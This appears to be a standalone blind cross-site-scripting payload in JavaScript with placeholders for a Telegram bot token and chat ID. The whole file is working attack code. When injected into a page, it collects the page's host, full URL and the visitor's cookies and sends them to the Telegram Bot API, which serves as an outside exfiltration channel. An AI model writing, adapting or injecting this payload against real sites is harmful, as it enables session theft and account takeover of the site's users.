const xhr = new XMLHttpRequest();
var token ='<YOUR TOKEN BOT>' ; 
var idchat = '<YOUR CHAT ID>';
var tercuri = '*XSS Triggered*%0AHostname : `' + document.location.host  + '` ' + "%0APath Location : `" + document.location.href+ '`'+ "%0ACookie : `" + document.cookie + "`" ;
try {
        xhr.open('GET', 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+idchat+'&text='+ tercuri+'&parse_mode=markdownv2', true);
        xhr.send();    
} catch (e) {   
        throw e;    
}